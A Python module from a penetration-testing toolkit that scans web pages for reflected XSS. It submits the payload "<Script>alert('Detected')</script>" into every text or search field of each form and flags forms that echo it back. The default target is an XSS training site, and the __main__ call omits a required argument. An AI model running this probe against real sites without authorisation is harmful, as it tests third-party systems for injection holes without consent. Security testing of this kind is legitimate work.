#!/usr/bin/python3
"""Hunter - is a pack of programs for interacting with the Internet, for conducting penetration testing, working with Linux and OSINT
Copyright (C) 2022, 2023 Okulus Dev (Alexeev Bronislav)

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more detailsession.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <https://www.gnu.org/licenses/>."""
import requests
from pprint import pprint
from bs4 import BeautifulSoup as bs
from urllib.parse import urljoin


def get_all_forms(url, fua):
	"""Вводится `url`, это возвращает все формы из HTML-контента"""
	headers = {
    	'User-Agent': fua
    }

	soup = bs(requests.get(url, headers=headers).content, "html.parser")
	return soup.find_all("form")


def get_form_details(form):
	"""Данная функция получает все возможные данные из HTML-формы"""
	details = {}
	# Получаем действие формы
	action = form.attrs.get("action", "").lower()
	
	# Получаем все методы формы (POST, GET, etc.)
	method = form.attrs.get("method", "get").lower()
	
	# Получаем все инпуты
	inputs = []
	
	for input_tag in form.find_all("input"):
		input_type = input_tag.attrs.get("type", "text")
		input_name = input_tag.attrs.get("name")
		inputs.append({"type": input_type, "name": input_name})
	
	# Добавляем в детали
	details["action"] = action
	details["method"] = method
	details["inputs"] = inputs

	return details


def submit_form(form_details, url, value):
	"""
	Отправляем данные формы
	Возвращает HTTP ответ
	"""
	target_url = urljoin(url, form_details["action"])
	inputs = form_details["inputs"]
	data = {}
	
	for input in inputs:
		# заменить весь текст и значения поиска на `value`
		if input["type"] == "text" or input["type"] == "search":
			input["value"] = value
	
		input_name = input.get("name")
		input_value = input.get("value")
	
		if input_name and input_value:
			data[input_name] = input_value

	print(f"[+] Отправка вредоносной полезной нагрузки на {target_url}")
	print(f"[+] Данные: {data}")
	
	if form_details["method"] == "post":
		return requests.post(target_url, data=data)
	else:
		# GET request
		return requests.get(target_url, params=data)


def scan_xss(url, fua):
	"""
	Получив `url`, он выводит все формы, уязвимые для XSS, и
	возвращает True, если кто-то из них уязвим, False в противном случае
	"""
	forms = get_all_forms(url, fua)
	
	print(f"[+] Найдено {len(forms)} форм на {url}.")
	
	js_script = "<Script>alert('Detected')</script>"
	is_vulnerable = False

	for form in forms:
		form_details = get_form_details(form)
		content = submit_form(form_details, url, js_script).content.decode()
		if js_script in content:
			print(f"[+] XSS найдена на {url}")
			print("[*] Детали формы:")
			pprint(form_details)
			is_vulnerable = True
	
	return is_vulnerable


if __name__ == "__main__":
	url = "https://xss-game.appspot.com/level1/frame"
	print(scan_xss(url))

